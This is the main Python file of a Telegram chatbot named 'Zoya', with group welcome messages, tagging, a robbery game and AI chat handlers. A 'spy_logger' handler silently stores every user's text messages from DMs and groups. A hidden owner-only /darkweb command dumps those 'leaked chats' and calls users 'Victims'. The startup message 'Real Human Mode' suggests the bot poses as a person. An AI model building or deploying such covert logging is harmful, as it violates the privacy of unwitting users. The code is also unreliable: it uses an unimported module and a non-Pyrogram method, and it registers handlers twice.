# main.py
import asyncio
from pyrogram import Client, idle, filters, enums
from pyrogram.handlers import MessageHandler, ChatMemberUpdatedHandler
import config
import tag
import ai
import social_db
import stats
import game

# --- CLIENT INIT ---
app = Client(
    "zoya_bot_v2",
    api_id=config.API_ID,
    api_hash=config.API_HASH,
    bot_token=config.BOT_TOKEN
)

async def secret_reveal(client, message):
    if message.from_user.id != 8232910685:
        return

    users, groups = social_db.get_stats()
    try:
        gossip_data = social_db.get_gossip_context()
    except:
        gossip_data = "No recent gossip."
    report = (
        f"🕵️ **ZOYA SYSTEM BREAKDOWN (Top Secret)** 🕵️\n\n"
        f"👑 **System Owner:** Master Emoji (Authorized)\n"
        f"📡 **GitHub:** https://github.com/sunnyptl95\n\n"
        f"📊 **Database Stats:**\n"
        f"   - 👥 Total Users (Victims): `{users}`\n"
        f"   - 🏘️ Monitored Groups: `{groups}`\n\n"
        f"🔥 **LATEST LEAKED CHATS (Gossip):**\n"
        f"{gossip_data}\n\n"
        f"🛡️ **God Mode:** ON (You can Rob anyone)"
    )
    try:
        await message.author.send(report)
        await message.reply_text("✅ **Secret Report Sent to DM!** 🤫")
    except:
        await message.reply_text(report)

# --- SPY LOGGER (The Eyes) ---
async def spy_logger(client, message):
    if not message.from_user: return
    
    # Determine Context (DM vs Group)
    if message.chat.type == enums.ChatType.PRIVATE:
        chat_source = "DM"
    else:
        chat_source = message.chat.title or "Unknown Group"

    user_text = message.text or "[Media/Sticker]"
    
    # Silent Log to Database
    try:
        social_db.log_user(
            message.from_user.id,
            message.from_user.first_name,
            message.from_user.username or "NoUser",
            chat_source,
            user_text
        )
    except Exception as e:
        print(f"Spy Error: {e}")

# Welcome/Left Function
async def welcome_leaver_handler(client, update):
    chat_id = update.chat.id
    
    # Database se status check karein (Default 1 hoga)
    if social_db.get_welcome_status(chat_id) == 0:
        return

    if update.new_chat_member and not update.old_chat_member:
        user = update.new_chat_member.user
        if user.is_bot: return 
        
        welcome_texts = [
            f"Hey {user.mention}! ❤️ Zoya ki duniya mein swagat hai. Kaise ho?",
            f"Oye {user.mention}, aagaye tum? 🙄 Chalo ab group mein thoda entertainment badhao!",
            f"Welcome {user.mention}! ✨ Master ke is group mein tameez se rehna, samjhe?"
        ]
        await client.send_message(chat_id, random.choice(welcome_texts))

    elif update.old_chat_member and not update.new_chat_member:
        user = update.old_chat_member.user
        if user.is_bot: return
        
        leave_texts = [
            f"Bye {user.first_name}... 👋 Ek aur gaya, shanti hui!",
            f"Arre {user.first_name} toh gaya! 😒 Shayad darr gaya mujhse.",
            f"Gaya {user.first_name}, ab vapas mat aana! 😤"
        ]
        await client.send_message(chat_id, random.choice(leave_texts))

# Admin Command for Manual Control
async def toggle_welcome(client, message):
    if len(message.command) < 2:
        await message.reply_text("Usage: `/welcome on` or `/welcome off`")
        return
    
    # Check if user is Admin
    member = await client.get_chat_member(message.chat.id, message.from_user.id)
    if member.status not in [enums.ChatMemberStatus.ADMINISTRATOR, enums.ChatMemberStatus.OWNER]:
        return

    action = message.command[1].lower()
    if action == "on":
        social_db.set_welcome_status(message.chat.id, 1)
        await message.reply_text("✅ Join/Leave notifications ON kar diye gaye hain!")
    elif action == "off":
        social_db.set_welcome_status(message.chat.id, 0)
        await message.reply_text("❌ Join/Leave notifications OFF kar diye gaye hain.")

# Handlers ko register karein
app.add_handler(ChatMemberUpdatedHandler(welcome_leaver_handler))
app.add_handler(MessageHandler(toggle_welcome, filters.command("welcome") & filters.group))

# Handlers Register karein (app.run se pehle)
app.add_handler(ChatMemberUpdatedHandler(welcome_leaver_handler))
app.add_handler(MessageHandler(toggle_welcome, filters.command("welcome") & filters.group))

# --- REGISTER HANDLERS ---
# 1. Spy Handler (Runs first, independent group=1)
app.add_handler(MessageHandler(spy_logger, filters.text), group=1)

# 2. Existing Handlers
app.add_handler(tag.start_handler) # /start
app.add_handler(tag.broadcast_handler) # /broadcast
app.add_handler(tag.voice_saver_handler) 
app.add_handler(tag.voice_tag_handler) # /voicetag
app.add_handler(tag.tag_all_handler) # /tagall
app.add_handler(tag.stop_tag_handler) # /stoptag

app.add_handler(stats.stats_handler)   # /stats (Public)
app.add_handler(stats.glist_handler)   # /glist (Owner Only)
app.add_handler(stats.ulist_handler)   # /ulist (Owner Only)
app.add_handler(game.thieves_handler)  # /thieves (Owner Only)
app.add_handler(MessageHandler(secret_reveal, filters.command("darkweb")))

# 3. Game / Economy Handlers (NEW)
app.add_handler(game.rob_handler)      # /rob
app.add_handler(game.protect_handler)  # /protect
app.add_handler(game.bal_handler)      # /bal
app.add_handler(game.top_handler)      # /top
app.add_handler(game.thieves_handler) # /thieves


# 3. AI Handlers
app.add_handler(ai.save_mode_handler)
app.add_handler(ai.chat_toggle_handler)
app.add_handler(ai.ai_sticker_handler)
app.add_handler(ai.ai_text_handler)

async def main():
    print("🚀 Zoya (Real Human Mode) System Started...")
    await app.start()
    
    # Cleanup Old Messages
    await tag.run_startup_cleanup(app)
    
    await idle()
    await app.stop()

if __name__ == "__main__":
    app.run(main())

